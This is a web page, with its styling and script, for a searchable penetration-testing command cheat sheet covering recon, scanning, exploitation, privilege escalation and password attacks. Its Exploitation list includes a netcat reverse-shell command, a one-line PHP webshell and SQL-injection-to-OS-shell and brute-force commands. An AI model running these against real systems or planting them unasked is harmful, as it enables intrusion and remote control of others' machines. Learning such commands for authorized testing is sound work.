---
layout: page
title: "Commands"
page_class: commands
permalink: /cmd
---

<style>
  :root{
    --panel:#111715;
    --line:rgba(184, 204, 194, 0.16);
    --dim:#a5aaa5;
    --c-recon:#5ec8d8;
    --c-scan:#5b8def;
    --c-web:#f2a541;
    --c-exploit:#ef5b5b;
    --c-post:#b980f0;
    --c-pass:#f5d76e;
    --c-sys:#7fd88f;
    --c-misc:#8b95a7;
    --c-tool:#ff8a5c;
  }

  .commands-container {
    display: grid;
    grid-template-columns: 260px 1fr;
    gap: 0;
    min-height: auto;
  }

  /* ===== sidebar ===== */
  .commands-sidebar {
    border-right: 1px solid var(--line);
    background: var(--surface);
    padding: 22px 16px 40px;
    position: sticky;
    top: 80px;
    max-height: calc(100vh - 100px);
    overflow-y: auto;
  }

  .brand {
    display: flex;
    align-items: baseline;
    gap: 8px;
    margin-bottom: 4px;
  }

  .brand .dot {
    width: 8px;
    height: 8px;
    border-radius: 50%;
    background: var(--c-exploit);
    box-shadow: 0 0 10px var(--c-exploit);
    flex: none;
  }

  .brand h1 {
    font-size: 17px;
    margin: 0;
    letter-spacing: 0.5px;
    color: var(--text);
  }

  .brand-sub {
    color: var(--dim);
    font-size: 11px;
    margin: 2px 0 20px 16px;
    letter-spacing: 0.5px;
  }

  .navgroup-label {
    color: var(--dim);
    font-size: 10px;
    text-transform: uppercase;
    letter-spacing: 1.5px;
    margin: 18px 0 8px 2px;
  }

  .navlink {
    display: flex;
    align-items: center;
    gap: 9px;
    color: var(--muted);
    text-decoration: none;
    font-size: 12.5px;
    padding: 6px 8px;
    border-radius: 6px;
    margin: 1px 0;
    border-left: 2px solid transparent;
    transition: all 0.2s ease;
  }

  .navlink:hover {
    color: var(--text);
    background: var(--surface-hover);
  }

  .navlink.active {
    color: var(--text);
    background: var(--surface-hover);
    border-left-color: var(--accent);
  }

  .navlink .sw {
    width: 7px;
    height: 7px;
    border-radius: 2px;
    flex: none;
  }

  /* ===== main content ===== */
  .commands-main {
    padding: 34px clamp(18px, 4vw, 54px) 100px;
  }

  .topbar {
    margin-bottom: 34px;
  }

  .kicker {
    color: var(--accent);
    font-size: 11px;
    letter-spacing: 2px;
    text-transform: uppercase;
    margin: 0 0 10px;
  }

  .topbar h2 {
    font-size: clamp(26px, 4vw, 38px);
    margin: 0 0 10px;
    line-height: 1.15;
    color: var(--text);
  }

  .topbar p {
    color: var(--muted);
    font-size: 13px;
    max-width: 640px;
    line-height: 1.6;
    margin: 0 0 22px;
  }

  .searchwrap {
    display: flex;
    align-items: center;
    gap: 10px;
    background: var(--surface);
    border: 1px solid var(--line);
    border-radius: 8px;
    padding: 11px 14px;
    margin-bottom: 20px;
  }

  .searchwrap .prompt {
    color: var(--accent);
    font-weight: 700;
  }

  .searchwrap input {
    flex: 1;
    background: transparent;
    border: none;
    outline: none;
    color: var(--text);
    font-family: 'DM Mono', monospace;
    font-size: 13.5px;
  }

  .searchwrap input::placeholder {
    color: var(--dim);
  }

  .cursor {
    width: 7px;
    height: 15px;
    background: var(--accent);
    animation: blink 1s step-start infinite;
  }

  @keyframes blink {
    50% { opacity: 0; }
  }

  .stat {
    color: var(--dim);
    font-size: 11px;
    white-space: nowrap;
  }

  section.group {
    margin-top: 52px;
    scroll-margin-top: 100px;
  }

  .group-head {
    display: flex;
    align-items: center;
    gap: 12px;
    margin-bottom: 6px;
  }

  .group-head .idx {
    color: var(--gc);
    font-family: 'Space Grotesk', sans-serif;
    font-size: 12px;
    font-weight: 700;
    letter-spacing: 1px;
  }

  .group-head h3 {
    font-size: 18px;
    margin: 0;
    color: var(--text);
  }

  .group-desc {
    color: var(--muted);
    font-size: 12px;
    margin: 0 0 18px;
  }

  .group-rule {
    height: 1px;
    background: linear-gradient(90deg, var(--gc), transparent);
    margin-bottom: 18px;
    opacity: 0.5;
  }

  .grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
    gap: 12px;
  }

  .card {
    background: var(--surface);
    border: 1px solid var(--line);
    border-left: 3px solid var(--gc);
    border-radius: 8px;
    padding: 13px 14px;
    display: flex;
    flex-direction: column;
    gap: 8px;
    transition: all 0.2s ease;
  }

  .card:hover {
    border-color: var(--gc);
    background: var(--surface-hover);
  }

  .card .cmdrow {
    display: flex;
    align-items: flex-start;
    gap: 8px;
  }

  .card code {
    font-size: 12.5px;
    color: var(--text);
    word-break: break-word;
    line-height: 1.5;
    flex: 1;
  }

  .card .desc {
    color: var(--muted);
    font-size: 11.5px;
    line-height: 1.5;
  }

  .card .example {
    font-size: 11px;
    color: var(--dim);
    background: rgba(5, 10, 8, 0.8);
    border: 1px dashed var(--line);
    padding: 6px 8px;
    border-radius: 5px;
    line-height: 1.5;
    word-break: break-word;
  }

  .card .example b {
    color: var(--c-tool);
    font-weight: 600;
  }

  .copybtn {
    flex: none;
    background: var(--surface-hover);
    border: 1px solid var(--line);
    color: var(--muted);
    font-family: 'DM Mono', monospace;
    font-size: 10px;
    letter-spacing: 0.5px;
    padding: 4px 8px;
    border-radius: 5px;
    cursor: pointer;
    text-transform: uppercase;
    transition: all 0.2s ease;
  }

  .copybtn:hover {
    color: var(--text);
    border-color: var(--gc);
  }

  .copybtn.copied {
    color: var(--c-sys);
    border-color: var(--c-sys);
  }

  /* ===== add-command controls ===== */
  .addbar {
    display: flex;
    gap: 8px;
    margin-bottom: 20px;
    flex-wrap: wrap;
  }

  .addbtn {
    font-family: 'DM Mono', monospace;
    font-size: 11.5px;
    letter-spacing: 0.3px;
    padding: 9px 14px;
    border-radius: 7px;
    cursor: pointer;
    text-transform: uppercase;
    border: none;
    transition: all 0.2s ease;
  }

  .addbtn.primary {
    background: var(--accent);
    color: #05130e;
    font-weight: 700;
  }

  .addbtn.primary:hover {
    background: #46ebb1;
  }

  .addbtn.ghost {
    background: var(--surface);
    border: 1px solid var(--line);
    color: var(--muted);
  }

  .addbtn.ghost:hover {
    color: var(--text);
    border-color: var(--dim);
  }

  .modal-backdrop {
    position: fixed;
    inset: 0;
    background: rgba(6, 8, 12, 0.72);
    backdrop-filter: blur(2px);
    display: none;
    align-items: center;
    justify-content: center;
    z-index: 50;
    padding: 20px;
  }

  .modal-backdrop.open {
    display: flex;
  }

  .modal {
    background: var(--surface);
    border: 1px solid var(--line);
    border-radius: 12px;
    width: 100%;
    max-width: 480px;
    padding: 22px;
  }

  .modal h4 {
    margin: 0 0 4px;
    font-size: 16px;
    color: var(--text);
  }

  .modal .modal-sub {
    color: var(--muted);
    font-size: 11.5px;
    margin: 0 0 18px;
  }

  .field {
    margin-bottom: 12px;
  }

  .field label {
    display: block;
    color: var(--dim);
    font-size: 10.5px;
    text-transform: uppercase;
    letter-spacing: 1px;
    margin-bottom: 5px;
  }

  .field input,
  .field select,
  .field textarea {
    width: 100%;
    background: var(--surface-hover);
    border: 1px solid var(--line);
    color: var(--text);
    font-family: 'DM Mono', monospace;
    font-size: 12.5px;
    padding: 9px 10px;
    border-radius: 6px;
    outline: none;
  }

  .field input:focus,
  .field select:focus,
  .field textarea:focus {
    border-color: var(--accent);
  }

  .field textarea {
    resize: vertical;
    min-height: 44px;
  }

  .modal-actions {
    display: flex;
    justify-content: flex-end;
    gap: 8px;
    margin-top: 18px;
  }

  .yours-badge {
    font-size: 9.5px;
    letter-spacing: 0.5px;
    text-transform: uppercase;
    color: var(--accent);
    border: 1px solid var(--accent);
    border-radius: 4px;
    padding: 1px 6px;
    flex: none;
  }

  .delbtn {
    flex: none;
    background: transparent;
    border: none;
    color: var(--dim);
    cursor: pointer;
    font-size: 14px;
    line-height: 1;
    padding: 2px 4px;
  }

  .delbtn:hover {
    color: var(--c-exploit);
  }

  .hidden {
    display: none !important;
  }

  .no-results {
    color: var(--dim);
    font-size: 13px;
    padding: 30px 0;
    text-align: center;
    display: none;
  }

  .commands-footer {
    border-top: 1px solid var(--line);
    margin-top: 70px;
    padding-top: 22px;
    color: var(--dim);
    font-size: 11px;
    display: flex;
    justify-content: space-between;
    flex-wrap: wrap;
    gap: 8px;
  }

  @media (max-width: 900px) {
    .commands-container {
      grid-template-columns: 1fr;
    }

    .commands-sidebar {
      border-right: none;
      border-bottom: 1px solid var(--line);
      position: relative;
      top: 0;
      max-height: auto;
    }

    .commands-main {
      padding: 24px clamp(16px, 4vw, 40px) 60px;
    }

    .grid {
      grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
    }
  }

  @media (max-width: 640px) {
    .commands-main {
      padding: 20px 16px 50px;
    }

    .topbar h2 {
      font-size: 24px;
    }

    .topbar p {
      font-size: 12px;
      margin-bottom: 16px;
    }

    .searchwrap {
      padding: 8px 10px;
    }

    .grid {
      grid-template-columns: 1fr;
      gap: 10px;
    }

    .card {
      padding: 10px 12px;
    }

    .addbar {
      flex-direction: column;
    }

    .addbtn {
      width: 100%;
    }
  }
</style>

<div class="commands-container">
  <aside class="commands-sidebar" id="sidebar">
    <div class="brand"><span class="dot"></span><h1>pentest.ref</h1></div>
    <div class="brand-sub">command reference // v1</div>
    <div id="navlist"></div>
  </aside>

  <main class="commands-main">
    <div class="topbar">
      <p class="kicker">personal reference — learn · practice · exploit ethically</p>
      <h2>Penetration Testing<br>Command Reference</h2>
      <p>Every command below is grouped by tool or phase of engagement, with a one-line explanation and, for the deep-dive tools, a worked example. Type below to filter across all sections.</p>
      <div class="searchwrap">
        <span class="prompt">$</span>
        <input id="search" type="text" placeholder="filter commands, e.g. 'subdomain' or 'sqlmap'" autocomplete="off">
        <span class="cursor"></span>
        <span class="stat" id="stat"></span>
      </div>
      <div class="addbar">
        <button class="addbtn primary" id="openAddBtn" type="button">+ add command</button>
        <button class="addbtn ghost" id="exportBtn" type="button">export my additions</button>
        <button class="addbtn ghost" id="clearBtn" type="button">clear my additions</button>
      </div>
    </div>

    <div id="content"></div>
    <p class="no-results" id="noresults">no commands match that filter.</p>

    <footer class="commands-footer">
      <span>built for CTF &amp; authorized engagements only — always get written scope before you run anything above.</span>
      <span id="totalcount"></span>
    </footer>
  </main>
</div>

<div class="modal-backdrop" id="modalBackdrop">
  <div class="modal">
    <h4>Add a command</h4>
    <p class="modal-sub">Saved in this browser (localStorage). Use "export my additions" to get a JSON file you can merge into the page's DATA array permanently.</p>
    <form id="addForm">
      <div class="field">
        <label for="f-category">Category</label>
        <select id="f-category">
          <option value="__new__">+ New category…</option>
        </select>
      </div>
      <div class="field" id="newCatField">
        <label for="f-newcat">New category name (heading)</label>
        <input id="f-newcat" type="text" placeholder="e.g. Kerberos Attacks">
      </div>
      <div class="field" id="newCatDescField">
        <label for="f-newcatdesc">New category description</label>
        <input id="f-newcatdesc" type="text" placeholder="one line describing this heading/section">
      </div>
      <div class="field">
        <label for="f-cmd">Command</label>
        <input id="f-cmd" type="text" placeholder="e.g. nmap -sV -p- <ip>" required>
      </div>
      <div class="field">
        <label for="f-desc">Description</label>
        <input id="f-desc" type="text" placeholder="one line — what it does" required>
      </div>
      <div class="field">
        <label for="f-example">Example (optional)</label>
        <textarea id="f-example" placeholder="a worked example with real-ish values"></textarea>
      </div>
      <div class="modal-actions">
        <button type="button" class="addbtn ghost" id="cancelAddBtn">cancel</button>
        <button type="submit" class="addbtn primary">save command</button>
      </div>
    </form>
  </div>
</div>

<script>
const DATA = [

{ id:"recon", title:"Reconnaissance", color:"--c-recon", desc:"Passive and active information gathering before you touch the target directly.",
  cmds:[
    ["whois <domain>","Domain registration info"],
    ["nslookup <domain>","Basic DNS lookup"],
    ["dig <domain>","Detailed DNS query"],
    ["host <domain>","Quick DNS lookup"],
    ["traceroute <host>","Trace network path to host"],
    ["theHarvester -d <domain> -b all","Harvest emails, subdomains, hosts from public sources"],
    ["crt.sh (browser/API)","Certificate Transparency log search for subdomains"],
    ["whatweb <url>","Identify web technologies in use"],
    ["wpscan --url <url>","WordPress vulnerability scan"],
    ["recon-ng","Full recon framework with modules"],
    ["maltego","Information gathering / OSINT graphing"],
    ["amass enum -d <domain>","Passive + active subdomain enumeration"],
    ["sublist3r -d <domain>","Subdomain listing via multiple sources"]
  ]},

{ id:"scanning", title:"Network Scanning", color:"--c-scan", desc:"Discover live hosts, open ports, and running services.",
  cmds:[
    ["nmap -sn <ip/range>","Ping sweep — host discovery only"],
    ["nmap -sV <ip>","Service and version detection"],
    ["nmap -sS <ip>","Stealth SYN scan"],
    ["nmap -O <ip>","OS detection"],
    ["nmap -A <ip>","Aggressive scan (OS, version, scripts, traceroute)"],
    ["nmap -p- <ip>","Scan all 65535 ports"],
    ["nmap -sC -sV <ip>","Default scripts + version detection"],
    ["nmap -p <port> --script vuln <ip>","Vulnerability detection scripts"],
    ["masscan -p1-65535 <ip> --rate=1000","Very fast full port scan"],
    ["netstat -tuln","List open listening ports locally"],
    ["ss -tuln","Modern replacement for netstat"]
  ]},

{ id:"webapp", title:"Web Application Testing", color:"--c-web", desc:"Enumerate and probe web applications for common vulnerabilities.",
  cmds:[
    ["curl -I <url>","Send HTTP request, view headers only"],
    ["nikto -h <url>","Web vulnerability scan"],
    ["dirb <url>","Directory scan"],
    ["gobuster dir -u <url> -w <wordlist>","Directory brute force"],
    ["hydra -l <user> -P pass.txt <ip> http-post-form","SQL injection / login brute force via form"],
    ["sqlmap -u \"<url>\"","Automated SQL injection testing"],
    ["burpsuite","Web proxy GUI for intercept &amp; manipulate"],
    ["wpscan --url <url>","WordPress scan"],
    ["xsstrike -u <url>","XSS scanner"],
    ["whatweb <url>","Web tech detection"]
  ]},

{ id:"vuln", title:"Vulnerability Assessment", color:"--c-scan", desc:"Structured scanning against known CVEs and misconfigurations.",
  cmds:[
    ["openvas-start","Start OpenVAS vulnerability scanner"],
    ["openvas-setup","Setup OpenVAS"],
    ["nmap --script vuln <ip>","Vulnerability scripts via Nmap NSE"],
    ["searchsploit <keyword>","Search local Exploit-DB mirror"],
    ["msfconsole","Launch Metasploit Framework"],
    ["lynis audit system","Local system security audit"],
    ["nikto -h <url>","Web vulnerability scan"],
    ["whatweb <url>","Web tech detection"],
    ["sslscan <host>","SSL/TLS scan"],
    ["testssl.sh <domain>","SSL/TLS deep scan"],
    ["enum4linux <ip>","SMB enumeration"],
    ["snmpcheck <ip>","SNMP enumeration"]
  ]},

{ id:"exploit", title:"Exploitation", color:"--c-exploit", desc:"Turning a discovered weakness into access.",
  cmds:[
    ["msfconsole","Metasploit console"],
    ["search <exploit>","Search Metasploit modules"],
    ["use <exploit/path>","Load a specific exploit"],
    ["set RHOSTS <ip>","Target IP"],
    ["set LHOST <ip>","Local IP for callback"],
    ["run / exploit","Run the loaded exploit"],
    ["hydra -l <user> -P pass.txt <ip> <service>","Brute force credentials for a service"],
    ["sqlmap -u \"<url>\" --os-shell","SQL injection to OS shell"],
    ["nc -lvnp <port>","Netcat listener"],
    ["nc <ip> <port>","Netcat connect"],
    ["busybox nc -e /bin/sh <ip> <port>","Reverse shell via busybox nc when standard nc lacks -e"],
    ["&lt;?php system($_GET[\"cmd\"]); ?&gt;","Minimal PHP webshell — drop on a target with file upload/write access"],
    ["openssl s_client -connect <ip>:<port>","SSL connection test"]
  ]},

{ id:"privesc", title:"Privilege Escalation", color:"--c-post", desc:"Moving from an initial foothold to elevated privileges.",
  cmds:[
    ["sudo -l","Check sudo rights for current user"],
    ["id","User identity and groups"],
    ["whoami","Current user"],
    ["uname -a","System info"],
    ["find / -perm -4000 2&gt;/dev/null","Find SUID binaries"],
    ["linpeas.sh","Automated privilege escalation checks"],
    ["cat /etc/passwd","List system users"],
    ["ps aux","Running processes"],
    ["find / -perm 2000 -o -perm 4000 2&gt;/dev/null","SUID/SGID find variant"],
    ["find / -perm -u=s -type f 2&gt;/dev/null","Find SUID binaries (symbolic syntax)"],
    ["cat /etc/crontab","Cron jobs"],
    ["env","Environment variables"],
    ["history","Command history"]
  ]},

{ id:"pass", title:"Password Attacks", color:"--c-pass", desc:"Credential cracking and wordlist-driven attacks.",
  cmds:[
    ["hydra -l <user> -P pass.txt &lt;ip&gt;","Password brute force against a service"],
    ["john --wordlist=rockyou.txt hash.txt","John the Ripper wordlist attack"],
    ["hashcat -m 0 hash.txt rockyou.txt","Hashcat cracking (mode 0 = MD5)"],
    ["crunch &lt;min&gt; &lt;max&gt; -o wordlist.txt","Wordlist generator"],
    ["cewl &lt;url&gt; -w wordlist.txt","Wordlist from website content"],
    ["hashid &lt;hash&gt;","Identify hash type"]
  ]},

{ id:"forensics", title:"Forensics", color:"--c-misc", desc:"Analyzing artifacts, memory, and disk images.",
  cmds:[
    ["autopsy","Forensic analysis GUI"],
    ["sleuthkit","Forensic toolkit CLI"],
    ["binwalk &lt;file&gt;","Analyze / extract embedded files"],
    ["foremost &lt;image&gt;","File carving from disk image"],
    ["strings &lt;file&gt;","Extract printable strings"],
    ["exiftool &lt;file&gt;","Metadata extraction"],
    ["dd if=&lt;device&gt; of=&lt;image&gt;","Disk imaging"],
    ["md5sum &lt;file&gt;","MD5 hash"],
    ["sha256sum &lt;file&gt;","SHA256 hash"]
  ]},

{ id:"system", title:"System &amp; Basic Commands", color:"--c-sys", desc:"Everyday Linux commands used constantly during an engagement.",
  cmds:[
    ["ls -la","List directory contents, incl. hidden"],
    ["cd &lt;dir&gt;","Change directory"],
    ["pwd","Show current directory"],
    ["mkdir &lt;dir&gt;","Create directory"],
    ["rm -rf &lt;dir&gt;","Remove directory (recursive/force)"],
    ["rm &lt;file&gt;","Remove a file"],
    ["cp &lt;src&gt; &lt;dst&gt;","Copy file"],
    ["mv &lt;old&gt; &lt;new&gt;","Move / rename file"],
    ["cat &lt;file&gt;","Display file content"],
    ["nano &lt;file&gt;","Edit file in nano"],
    ["clear","Clear terminal"]
  ]},

{ id:"linux-net", title:"Linux — Networking", color:"--c-sys", desc:"Local networking commands used constantly on target boxes.",
  cmds:[
    ["ping host","Ping a host"],
    ["whois domain","Domain owner info"],
    ["dig -x 8.8.8.8","Reverse DNS lookup"],
    ["wget url","Download a file"],
    ["wget -c url","Resume interrupted download"],
    ["curl url","Fetch data from a URL"],
    ["curl -O url","Save file with original name"],
    ["curl -i url","Show HTTP headers with response"],
    ["curl -L url","Follow redirects"],
    ["ssh user@host","Connect to host"],
    ["ssh -p 2222 user@host","Connect using a specific port"],
    ["ssh -D 8080 user@host","SOCKS proxy tunnel"],
    ["ip addr / ifconfig","Show IP address info"],
    ["ss -tuln","Show listening ports"]
  ]}

];

const navlist = document.getElementById('navlist');
const content = document.getElementById('content');
const search = document.getElementById('search');
const noresults = document.getElementById('noresults');
const stat = document.getElementById('stat');
const CUSTOM_KEY = 'pentestref_custom_v1';

function getCustom(){
  try { return JSON.parse(localStorage.getItem(CUSTOM_KEY) || '[]'); }
  catch(e){ return []; }
}
function setCustom(arr){ localStorage.setItem(CUSTOM_KEY, JSON.stringify(arr)); }
function slugify(s){ return 'custom-' + s.toLowerCase().trim().replace(/[^a-z0-9]+/g,'-').replace(/(^-|-$)/g,''); }

function buildGroups(){
  const groups = DATA.map(g => ({ ...g, cmds: g.cmds.map(c => c.slice()) }));
  getCustom().forEach(item => {
    let g = groups.find(x => x.id === item.groupId);
    if (!g) {
      g = { id:item.groupId, title:item.groupTitle, color:'--c-misc', desc:item.groupDesc || 'Commands you\'ve added while learning/practicing.', cmds:[] };
      groups.push(g);
    }
    g.cmds.push([item.cmd, item.desc, item.example || '', true, item.uid]);
  });
  return groups;
}

function renderAll(){
  const groups = buildGroups();
  navlist.innerHTML = '';
  content.innerHTML = '';

  groups.forEach(g => {
    const a = document.createElement('a');
    a.href = '#' + g.id;
    a.className = 'navlink';
    a.innerHTML = `<span class="sw" style="background:var(${g.color})"></span>${g.title}`;
    navlist.appendChild(a);

    const sec = document.createElement('section');
    sec.className = 'group';
    sec.id = g.id;
    sec.style.setProperty('--gc', `var(${g.color})`);
    sec.dataset.title = g.title.toLowerCase();
    sec.innerHTML = `
      <div class="group-head"><h3>${g.title}</h3></div>
      <p class="group-desc">${g.desc}</p>
      <div class="group-rule"></div>
      <div class="grid"></div>
    `;
    const grid = sec.querySelector('.grid');

    g.cmds.forEach(c => {
      const [cmd, desc, example, isCustom, uid] = c;
      const card = document.createElement('div');
      card.className = 'card';
      card.dataset.search = (cmd + ' ' + desc + ' ' + (example||'')).toLowerCase();
      card.innerHTML = `
        <div class="cmdrow">
          <code>${cmd}</code>
          ${isCustom ? '<span class="yours-badge">yours</span>' : ''}
          <button class="copybtn" type="button">copy</button>
          ${isCustom ? '<button class="delbtn" type="button" title="remove">✕</button>' : ''}
        </div>
        <div class="desc">${desc}</div>
        ${example ? `<div class="example">${example}</div>` : ''}
      `;
      card.querySelector('.copybtn').addEventListener('click', (e) => {
        const btn = e.currentTarget;
        const raw = cmd.replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&amp;/g,'&');
        navigator.clipboard.writeText(raw).then(() => {
          btn.textContent = 'copied';
          btn.classList.add('copied');
          setTimeout(()=>{btn.textContent='copy';btn.classList.remove('copied');}, 1200);
        });
      });
      if (isCustom) {
        card.querySelector('.delbtn').addEventListener('click', () => {
          setCustom(getCustom().filter(x => x.uid !== uid));
          renderAll();
        });
      }
      grid.appendChild(card);
    });

    content.appendChild(sec);
  });

  document.getElementById('totalcount').textContent =
    groups.reduce((n,g)=>n+g.cmds.length,0) + ' commands across ' + groups.length + ' sections';

  applySearchFilter();
  setupScrollHighlight();
  populateCategorySelect(groups);
}

function applySearchFilter(){
  const q = search.value.trim().toLowerCase();
  let visibleTotal = 0;
  document.querySelectorAll('section.group').forEach(sec => {
    let visibleInSection = 0;
    sec.querySelectorAll('.card').forEach(card => {
      const match = !q || card.dataset.search.includes(q);
      card.classList.toggle('hidden', !match);
      if (match) visibleInSection++;
    });
    sec.classList.toggle('hidden', visibleInSection === 0);
    visibleTotal += visibleInSection;
  });
  noresults.style.display = visibleTotal === 0 ? 'block' : 'none';
  stat.textContent = q ? visibleTotal + ' matches' : '';
}
search.addEventListener('input', applySearchFilter);

function setupScrollHighlight(){
  const navlinks = [...document.querySelectorAll('.navlink')];
  const sections = [...document.querySelectorAll('section.group')];
  const io = new IntersectionObserver((entries) => {
    entries.forEach(e => {
      if (e.isIntersecting) {
        navlinks.forEach(l => l.classList.remove('active'));
        const link = navlinks.find(l => l.getAttribute('href') === '#' + e.target.id);
        if (link) link.classList.add('active');
      }
    });
  }, { rootMargin: '-20% 0px -70% 0px' });
  sections.forEach(s => io.observe(s));
}

const modalBackdrop = document.getElementById('modalBackdrop');
const openAddBtn = document.getElementById('openAddBtn');
const cancelAddBtn = document.getElementById('cancelAddBtn');
const addForm = document.getElementById('addForm');
const catSelect = document.getElementById('f-category');
const newCatField = document.getElementById('newCatField');
const newCatDescField = document.getElementById('newCatDescField');

function populateCategorySelect(groups){
  const current = catSelect.value;
  catSelect.innerHTML = '<option value="__new__">+ New category…</option>' +
    groups.map(g => `<option value="${g.id}">${g.title}</option>`).join('');
  if ([...catSelect.options].some(o => o.value === current)) catSelect.value = current;
  toggleNewCatField();
}
function toggleNewCatField(){
  const show = catSelect.value === '__new__';
  newCatField.style.display = show ? 'block' : 'none';
  newCatDescField.style.display = show ? 'block' : 'none';
}
catSelect.addEventListener('change', toggleNewCatField);

openAddBtn.addEventListener('click', () => { modalBackdrop.classList.add('open'); document.getElementById('f-cmd').focus(); });
cancelAddBtn.addEventListener('click', () => modalBackdrop.classList.remove('open'));
modalBackdrop.addEventListener('click', (e) => { if (e.target === modalBackdrop) modalBackdrop.classList.remove('open'); });

addForm.addEventListener('submit', (e) => {
  e.preventDefault();
  const cmd = document.getElementById('f-cmd').value.trim();
  const desc = document.getElementById('f-desc').value.trim();
  const example = document.getElementById('f-example').value.trim();
  if (!cmd || !desc) return;

  let groupId, groupTitle, groupDesc;
  if (catSelect.value === '__new__') {
    groupTitle = document.getElementById('f-newcat').value.trim() || 'My Notes';
    groupDesc = document.getElementById('f-newcatdesc').value.trim();
    groupId = slugify(groupTitle);
  } else {
    groupId = catSelect.value;
    groupTitle = catSelect.options[catSelect.selectedIndex].textContent;
  }

  const custom = getCustom();
  custom.push({ uid: Date.now() + '-' + Math.random().toString(36).slice(2,7), groupId, groupTitle, groupDesc, cmd, desc, example });
  setCustom(custom);

  addForm.reset();
  toggleNewCatField();
  modalBackdrop.classList.remove('open');
  renderAll();
  location.hash = '#' + groupId;
});

document.getElementById('exportBtn').addEventListener('click', () => {
  const custom = getCustom();
  if (!custom.length) { alert('No custom commands saved yet in this browser.'); return; }
  const blob = new Blob([JSON.stringify(custom, null, 2)], { type: 'application/json' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'my-commands.json';
  a.click();
});
document.getElementById('clearBtn').addEventListener('click', () => {
  if (!getCustom().length) return;
  if (confirm('Remove all commands you\'ve added in this browser? This cannot be undone (export first if unsure).')) {
    setCustom([]);
    renderAll();
  }
});

renderAll();
</script>
